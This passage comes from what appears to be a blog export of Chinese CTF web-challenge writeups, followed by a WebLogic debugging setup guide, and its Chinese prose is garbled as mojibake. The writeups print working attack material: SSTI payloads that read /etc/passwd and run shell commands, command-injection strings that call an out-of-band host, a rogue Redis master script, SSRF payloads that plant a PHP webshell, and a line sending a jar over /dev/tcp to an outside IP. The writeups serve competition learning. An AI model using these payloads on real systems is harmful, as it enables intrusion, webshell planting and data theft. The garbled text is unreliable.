class="string">"Hello"</span>))</span><br><span class="line">    user=user.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    name = base64.urlsafe_b64decode(user)</span><br><span class="line">    num = float(request.form[<span class="string">'num'</span>])</span><br><span class="line">    <span class="keyword">if</span>(num&lt;<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Too Small"</span></span><br><span class="line">    <span class="keyword">elif</span> num&gt;<span class="number">1000000000.0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Too Large"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(guessNum(num,name))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miss</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"What are you looking for?!!"</span>.getattr(app, <span class="string">'__name__'</span>, getattr(app.__class__, <span class="string">'__name__'</span>)), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    f_handler=open(<span class="string">'/var/log/app.log'</span>, <span class="string">'w'</span>)</span><br><span class="line">    sys.stderr=f_handler</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124205419080.png" alt="image-20201124205419080"></p>
<p><a href="https://www.jianshu.com/p/d9caa4ab46e1" target="_blank" rel="noopener">https://www.jianshu.com/p/d9caa4ab46e1</a></p>
<p>flaskå¼€å¯debugï¼Œå¯ä»¥è¿›å…¥consoleæ¨¡å¼ï¼Œä½†æ˜¯éœ€è¦pinç ï¼Œä¼šæŠŠpinç å†™è¿›<code>/var/log/app.log</code>ï¼Œå¯ä»¥é€šè¿‡è¯»è¿™ä¸ªæ–‡ä»¶æ¥è·å–pinç ï¼Œå› ä¸ºæ˜¯<code>python2</code>,ç›´æ¥ç”¨payload</p>
<ul>
<li>è¯»æ–‡ä»¶</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64.b64encode(&quot;&#123;&#123;().__class__.__base__.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;&quot;)</span><br><span class="line">&#39;e3soKS5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKVs0MF0oJy9ldGMvcGFzc3dkJykucmVhZCgpfX0&#x3D;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124210300013.png" alt="image-20201124210300013"></p>
<ul>
<li>æ‰§è¡Œå‘½ä»¤</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64.b64encode(&#39;&#39;&#39;&#123;&#123;().__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;e&#39;+&#39;val&#39;](&quot;__imp&quot;+&quot;ort__(&#39;o&#39;+&#39;s&#39;).po&quot;+&quot;pen(&#39;ls&#39;).read()&quot;)&#125;&#125;&#39;&#39;&#39;)</span><br><span class="line">&#39;e3soKS5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKVs1OV0uX19pbml0X18uX19nbG9iYWxzX19bJ19fYnVpbHRpbnNfXyddWydlJysndmFsJ10oIl9faW1wIisib3J0X18oJ28nKydzJykucG8iKyJwZW4oJ2xzJykucmVhZCgpIil9fQ&#x3D;&#x3D;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124210912886.png" alt="image-20201124210912886"></p>
<h1 id="0x03-Command"><a href="#0x03-Command" class="headerlink" title="0x03 Command"></a>0x03 Command</h1><blockquote>
<p>è¿™é¢˜å­¦å¼Ÿåšçš„ï¼Œä¸‹é¢æ˜¯å‚è€ƒäº†ç½‘ä¸Šçš„wp</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;|find%09&#x2F;%09-ctime%09-20</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;a.iz99lj.ceye.io%0aecho%09ZmxhZw&#x3D;&#x3D;|base64%09-d|xargs%09-</span><br><span class="line">I%09x%09find%09&#x2F;%09-name%09&quot;x????&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1%0aecho%09L2V0Yy8uZmluZGZsYWcvZmxhZy50eHQ&#x3D;|base64%09-</span><br><span class="line">d|xargs%09sed%09&quot;&quot;%09</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123154353952.png" alt="image-20201123154353952"></p>
<h1 id="0x04-doyouknowssrf"><a href="#0x04-doyouknowssrf" class="headerlink" title="0x04 doyouknowssrf"></a>0x04 doyouknowssrf</h1><p>GACTFåŸé¢˜ï¼Œç”¨wpçš„æ–¹æ³•è€æ˜¯å¤±è´¥ï¼Œå¯ä»¥ä¸»ä»åŒæ­¥å¤åˆ¶<code>exp.so</code>ï¼Œä½†æ˜¯<code>system.rev</code>æ‰§è¡Œä¸äº†ï¼Œä¹‹åè¯•äº†ä¸€ä¸‹ï¼Œconfig set dir /var/www/html   ç„¶ååˆ©ç”¨ï¼Œä¸»ä»åŒæ­¥å°†ä¸€å¥è¯æœ¨é©¬åŒæ­¥åˆ°é¶æœºï¼Œï¼ˆæ„Ÿè§‰è¿™é¢˜ä¸ç”¨ä¸»ä»å¤åˆ¶ï¼Œç›´æ¥å†™é©¬å°±å¯ä»¥ï¼‰ç„¶åï¼Œè®¿é—®æœ¨é©¬ï¼Œå¾—åˆ°flagã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO, format=<span class="string">'&gt;&gt; %(message)s'</span>)</span><br><span class="line">DELIMITER = <span class="string">b"\r\n"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RoguoHandler</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b'*'</span>):</span><br><span class="line">            <span class="keyword">return</span> data.strip().split(DELIMITER)[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b'$'</span>):</span><br><span class="line">            <span class="keyword">return</span> data.split(DELIMITER, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> data.strip().split()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">            logging.info(<span class="string">"receive data: %r"</span>, data)</span><br><span class="line">            arr = self.decode(data)</span><br><span class="line">            <span class="keyword">if</span> arr[<span class="number">0</span>].startswith(<span class="string">b'PING'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+PONG'</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b'REPLCONF'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+OK'</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b'PSYNC'</span>) <span class="keyword">or</span> arr[<span class="number">0</span>].startswith(<span class="string">b'SYNC'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+FULLRESYNC '</span> + <span class="string">b'Z'</span> * <span class="number">40</span> + <span class="string">b' 1'</span> + DELIMITER)</span><br><span class="line">                self.request.sendall(<span class="string">b'$'</span> + str(len(self.server.payload)).encode() + DELIMITER)</span><br><span class="line">                self.request.sendall(self.server.payload + DELIMITER)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        self.finish()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finish</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.request.close()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RoguoServer</span><span class="params">(socketserver.TCPServer)</span>:</span></span><br><span class="line">    allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, server_address, payload)</span>:</span></span><br><span class="line">        super(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="literal">True</span>)</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"a.php"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server = RoguoServer((<span class="string">'0.0.0.0'</span>, <span class="number">6680</span>), f.read())</span><br><span class="line">    server.handle_request()</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®/var/www/htmlç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;root:root@127.0.0.1:5000@baidu.com&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:6379?%250D%250Aauth%2520123456%250d%250aconfig%2520set%2520dir%2520%252fvar%252fwww%252fhtml%250d%250a1</span><br></pre></td></tr></table></figure>

<p>ä¸»ä»å¤åˆ¶ğŸ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;root:root@127.0.0.1:5000@baidu.com&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:6379?%250D%250Aauth%2520123456%250d%250aconfig%2520set%2520dbfilename%2520a.php%250d%250aslaveof%2520ip%25206680%250d%250aquit%250a1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123233920735.png" alt="image-20201123233920735"></p>
<h1 id="0x05-easyzzzz"><a href="#0x05-easyzzzz" class="headerlink" title="0x05 easyzzzz"></a>0x05 easyzzzz</h1><p>è®¿é—®<code>/æ›´æ–°æ—¥å¿—.txt</code>,å¯ä»¥çŸ¥é“æ˜¯1.8.0ç‰ˆæœ¬ï¼Œç”¨<a href="https://github.com/h4ckdepy/zzzphp/issues/1" target="_blank" rel="noopener">è¿™ä¸ª</a>å¯ä»¥æ³¨å‡ºå¯†ç ï¼Œmd5è§£å¯†åç™»åå°ï¼Œåå°æœ‰ä¸€ä¸ªç»å…¸çš„ä¿®æ”¹æ¨¡æ¿å¯¼è‡´çš„rceï¼Œ</p>
<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124211517841.png" alt="image-20201124211517841">)ç›´æ¥ç”¨<a href="https://mount4in.github.io/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/">å›½èµ›</a>çš„ä¸€é“é¢˜çš„payload</p>
<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124211628600.png" alt="image-20201124211628600"></p>
<h1 id="0x06-easygogogo"><a href="#0x06-easygogogo" class="headerlink" title="0x06 easygogogo"></a>0x06 easygogogo</h1>]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2020KCTFéƒ¨åˆ†é¢˜ç›®å¤ç°</title>
    <url>/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>KCTFå‡ é“Webé¢˜ç›®å¤ç°</p>
<a id="more"></a>

<p>å³é”®æºä»£ç </p>
<p><img src="/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20201120184014266.png" alt="image-20201120184014266"></p>
<p>æ”¹headerå¤´éƒ½æ²¡æœ‰ç”¨ï¼Œåº”è¯¥æ˜¯SSRFäº†ã€‚</p>
<p><a href="http://cn-sec.com/archives/151034.html" target="_blank" rel="noopener">å‚è€ƒ</a></p>
<blockquote>
<p><img src="/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20201120184645550.png" alt="image-20201120184645550"></p>
</blockquote>
<p>å°è¯•è¯»æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;getimage?url&#x3D;http:&#x2F;&#x2F;127.0.0.1%253a8088%253fwww.pediy.com&#x2F;loadConfig?url&#x3D;x.xml</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20201120184916212.png" alt="image-20201120184916212"></p>
<p><img src="/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20201120185024108.png" alt="image-20201120185024108"></p>
<p>å®˜æ–¹wpè¯´<code>FileSystemXmlApplicationContext</code>å¯ä»¥åŠ è½½è¿œç¨‹æ¶æ„çš„<code>xml</code>æ–‡ä»¶</p>
<blockquote>
<p><img src="/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20201120185201750.png" alt="image-20201120185201750"></p>
</blockquote>
<p>ç„¶ååå¼¹shellï¼Œé€šè¿‡nc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat vip-demo-0.0.1-SNAPSHOT.jar &gt; &#x2F;dev&#x2F;tcp&#x2F;144.34.200.151&#x2F;9966</span><br><span class="line">nc -lvnp 9966 &gt; b.jar</span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½jaråŒ…ï¼Œåœ¨æœ¬åœ°åç¼–è¯‘å°±å¯ä»¥å¾—åˆ°flagã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE any [</span><br><span class="line">&lt;!ENTITY  xxe  &quot;bbbbb&quot;&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;number&gt;fffff&lt;&#x2F;number&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>writewup</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntuæ­å»ºweblogicç¯å¢ƒ,é…åˆIDEAè°ƒè¯•</title>
    <url>/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>ä¹‹å‰éƒ½æ˜¯åˆ©ç”¨dockeræ­å»ºweblogicçš„æ¼æ´ç¯å¢ƒï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹åœ¨ubuntuä¸­æ­å»ºweblogicç¯å¢ƒ</p>
<a id="more"></a>

<blockquote>
<p>  jdk  ubuntu 18.04.3 (è™šæ‹Ÿæœºç£ç›˜ç©ºé—´é€‰å¤§ä¸€ç‚¹ï¼ˆ60Gï¼‰)</p>
</blockquote>
<h2 id="0x00-jdkå®‰è£…"><a href="#0x00-jdkå®‰è£…" class="headerlink" title="0x00 jdkå®‰è£…"></a>0x00 jdkå®‰è£…</h2><p>æ‰‹åŠ¨ä¸‹è½½å‹ç¼©åŒ…å®‰è£…oracle Java JDK</p>
<ul>
<li>åˆ›å»ºç›®å½•:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir &#x2F;usr&#x2F;lib&#x2F;jvm</span><br></pre></td></tr></table></figure>

<ul>
<li>è§£å‹ç¼©åˆ°è¯¥ç›®å½•:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf jdk-7u21-linux-x64.gz</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¿®æ”¹ç¯å¢ƒå˜é‡:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vi ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ ä¸‹é¢å†…å®¹ï¼š</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set oracle jdk environment</span><br><span class="line">#export JAVA_HOME&#x3D;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_121  ## è¿™é‡Œè¦æ³¨æ„ç›®å½•è¦æ¢æˆè‡ªå·±è§£å‹çš„jdk ç›®å½•</span><br><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.7.0_21  ## è¿™é‡Œè¦æ³¨æ„ç›®å½•è¦æ¢æˆè‡ªå·±è§£å‹çš„jdk ç›®å½•</span><br><span class="line">export JRE_HOME&#x3D;$&#123;JAVA_HOME&#125;&#x2F;jre  </span><br><span class="line">export CLASSPATH&#x3D;.:$&#123;JAVA_HOME&#125;&#x2F;lib:$&#123;JRE_HOME&#125;&#x2F;lib  </span><br><span class="line">export PATH&#x3D;$&#123;JAVA_HOME&#125;&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/zhu1361/article/details/103592544" target="_blank" rel="noopener">https://blog.csdn.net/zhu1361/article/details/103592544</a>  jdk9+</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set oracle jdk environment</span><br><span class="line">JAVA_HOME&#x3D;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk-9.0.4  ## è¿™é‡Œè¦æ³¨æ„ç›®å½•è¦æ¢æˆè‡ªå·±è§£å‹çš„jdk ç›®å½•</span><br><span class="line">JRE_HOME&#x3D;$JAVA_HOME </span><br><span class="line">CLASSPATH&#x3D;$JAVA_HOME&#x2F;lib</span><br><span class="line">PATH&#x3D;$JRE_HOME&#x2F;bin:$JAVA_HOME&#x2F;bin:$PATH</span><br><span class="line">export PATH JAVA_HOME CLASSPATH</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç¯å¢ƒå˜é‡é©¬ä¸Šç”Ÿæ•ˆï¼š</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source ~&#x2F;.bashrc</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>

<img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201120131639241.png" alt="image-20201120131639241" style="zoom:150%;">

<hr>
<p>å¦‚æœä½ å®‰è£…äº†å¤šä¸ªç‰ˆæœ¬çš„jdkï¼Œä½ å¯ä»¥é€šè¿‡ä¿®æ”¹<code>~/.bashrc</code>æ–‡ä»¶åé¢çš„<code>JAVA_HOME</code></p>
<h2 id="0x01-weblogic"><a href="#0x01-weblogic" class="headerlink" title="0x01 weblogic"></a>0x01 weblogic</h2><p>çœ‹äº†å¥½å¤šå¸–å­éƒ½è¯´è¦æ–°å»ºä¸€ä¸ªweblogicç”¨æˆ·ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo useradd -r -m -s &#x2F;bin&#x2F;bash weblogic</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å‚æ•°çš„æ„æ€ï¼š<br>-r å»ºç«‹ç³»ç»Ÿè´¦å·<br>-m è‡ªåŠ¨å»ºç«‹ç”¨æˆ·çš„ç™»å…¥ç›®å½•<br>-s /bin/bash æŒ‡å®šç”¨æˆ·ç™»å…¥åæ‰€ä½¿ç”¨çš„shell</p>
</blockquote>
<p>ä¿®æ”¹å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo passwd weblogic</span><br></pre></td></tr></table></figure>

<p>æ–°å»ºç”¨æˆ·å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar fmw_12.2.1.3.0_wls.jar</span><br><span class="line">æŠ¥é”™Exception in thread &quot;main&quot; java.awt.AWTError: Can&#39;t connect to X11 window server using &#39;:0&#39; as the value of the DISPLAY variable.</span><br></pre></td></tr></table></figure>

<p>åˆ‡æ¢å›åŸç”¨æˆ·å°±å¯ä»¥äº†ï¼Œæœäº†ä¸€ä¸‹åŸå› å¥½åƒæ˜¯å› ä¸ºweblogicç”¨æˆ·ä¸èƒ½æ‰“å¼€windowç•Œé¢ã€‚æˆ‘ä»¬è¿™é‡Œæ­å»ºçš„æœ¬æ„å°±æ˜¯ä¸ºäº†å¤ç°æ¼æ´ï¼Œä¹Ÿå¯ä»¥ä¸æ–°å»ºç”¨æˆ·ï¼Œç›´æ¥åœ¨å½“å‰ç”¨æˆ·å®‰è£…ï¼Œ</p>
<p><code>wls-silent.xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bea-installer</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">input-fields</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"BEAHOME"</span> <span class="attr">value</span>=<span class="string">"/home/weblogic/Oracle/Middleware"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"USER_INSTALL_DIR"</span> <span class="attr">value</span>=<span class="string">"/home/weblogic/Oracle/Middleware"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"COMPONENT_PATHS"</span> <span class="attr">value</span>=<span class="string">"WebLogic Server/Core Application Server|WebLogic Server/Administration Console|WebLogic Server/Configuration Wizard and Upgrade Framework|WebLogic Server/Web 2.0 HTTP Pub-Sub Server|WebLogic Server/WebLogic JDBC Drivers|WebLogic Server/Third Party JDBC Drivers|WebLogic Server/WebLogic Server Clients|WebLogic Server/WebLogic Web Server Plugins|WebLogic Server/UDDI and Xquery Support|WebLogic Server/Server Examples"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"INSTALL_NODE_MANAGER_SERVICE"</span> <span class="attr">value</span>=<span class="string">"no"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"INSTALL_SHORTCUT_IN_ALL_USERS_FOLDER"</span> <span class="attr">value</span>=<span class="string">"no"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"LOCAL_JVMS"</span> <span class="attr">value</span>=<span class="string">"/usr/lib/jvm/jdk1.6.0_45"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">input-fields</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bea-installer</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar wls1036_generic.jar -mode=silent -silent_xml=wls-silent.xml</span><br></pre></td></tr></table></figure>

<p><code>create-wls-domain.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Default domain 'base_domain' to be created inside the Docker image for WLS</span></span><br><span class="line"><span class="comment"># ==============================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Open default domain template</span></span><br><span class="line"><span class="comment"># ======================</span></span><br><span class="line">readTemplate(<span class="string">"/home/weblogic/Oracle/Middleware/wlserver_10.3/common/templates/domains/wls.jar"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure the Administration Server and SSL port.</span></span><br><span class="line"><span class="comment"># =========================================================</span></span><br><span class="line">cd(<span class="string">'Servers/AdminServer'</span>)</span><br><span class="line">set(<span class="string">'ListenAddress'</span>,<span class="string">''</span>)</span><br><span class="line">set(<span class="string">'ListenPort'</span>, <span class="number">7001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the user password for weblogic</span></span><br><span class="line"><span class="comment"># =====================================</span></span><br><span class="line">cd(<span class="string">'/'</span>)</span><br><span class="line">cd(<span class="string">'Security/base_domain/User/weblogic'</span>)</span><br><span class="line">cmo.setPassword(<span class="string">'Oracle@123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the domain and close the domain template</span></span><br><span class="line"><span class="comment"># ==============================================</span></span><br><span class="line">setOption(<span class="string">'OverwriteDomain'</span>, <span class="string">'true'</span>)</span><br><span class="line"></span><br><span class="line">writeDomain(<span class="string">'/home/weblogic/Oracle/Middleware/user_projects/domains/base_domain'</span>)</span><br><span class="line">closeTemplate()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exit WLST</span></span><br><span class="line"><span class="comment"># =========</span></span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>

<p><code>chmod +x create-wls-domain.py</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~/Oracle/Middleware/wlserver_10.3/common/bin$./wlst.sh -skipWLSModuleScanning /home/weblogic/Oracle/create-wls-domain.py</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~/Oracle/Middleware/user_projects/domains/base_domain/bin$ ./startWebLogic.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201202144942741.png" alt="image-20201202144942741"></p>
<h2 id="0x02-ideaè°ƒè¯•"><a href="#0x02-ideaè°ƒè¯•" class="headerlink" title="0x02 ideaè°ƒè¯•"></a>0x02 ideaè°ƒè¯•</h2><p>é¦–å…ˆä¿®æ”¹<code>~/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code></p>
<p>åœ¨æ–‡ä»¶å¤´åŠ å¦‚ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">debugFlag=<span class="string">"true"</span></span><br><span class="line"><span class="built_in">export</span> debugFlag</span><br></pre></td></tr></table></figure>

<img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203110506200.png" alt="image-20201203110506200" style="zoom: 200%;">

<p>ç„¶åè¿è¡Œ<code>./startWebLogic.sh</code></p>
<p>ç„¶åå°†<code>~/Oracle/Middleware/wlserver_10.3</code>ï¼Œç›®å½•å¤åˆ¶åˆ°æœ¬æœºï¼Œç„¶ååˆ©ç”¨<code>find ./ -name *.jar -exec cp {} ./weblogic_jar/ \;</code>åœ¨<code>~/Oracle/Middleware/</code>ç›®å½•ä¸‹æœç´¢<code>jar</code>æ–‡ä»¶ç„¶åå¤åˆ¶åˆ°weblogic_jarç›®å½•ï¼Œç„¶ååœ¨æœ¬åœ°æ‰“å¼€IDEAï¼Œå°†<code>weblogic_jar</code>æ·»åŠ åˆ°librariesï¼Œ</p>
<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203111249352.png" alt="image-20201203111249352"></p>
<p>å°†jdkæ”¹ä¸ºå’Œjdk6</p>
<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203111330965.png" alt="image-20201203111330965"></p>
<p>ç„¶ååœ¨ä¸‹æ–­ç‚¹ï¼Œå¼€å¯è°ƒè¯•</p>
<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203111434909.png" alt="image-20201203111434909"></p>
<p>burpå‘åŒ…</p>
<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203111505573.png" alt="image-20201203111505573"></p>
<p>å¯ä»¥çœ‹åˆ°æˆåŠŸã€‚</p>
<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203111519281.png" alt="image-20201203111519281"></p>
<p><a href="https://blog.csdn.net/zbj18314469395/article/details/86064849" target="_blank" rel="noopener">https://blog.csdn.net/zbj18314469395/article/details/86064849</a></p>
<p><a href="https://starky99.com/ubuntu16-install-weblogic10.3.6/" target="_blank" rel="noopener">Ubuntu16.04å‘½ä»¤è¡Œå®‰è£…Weblogic</a></p>
<p><a href="https://blog.csdn.net/qq_36205145/article/details/70473545" target="_blank" rel="noopener">åœ¨ubuntu 16.04ä¸Šå®‰è£…weblogic 12c</a></p>
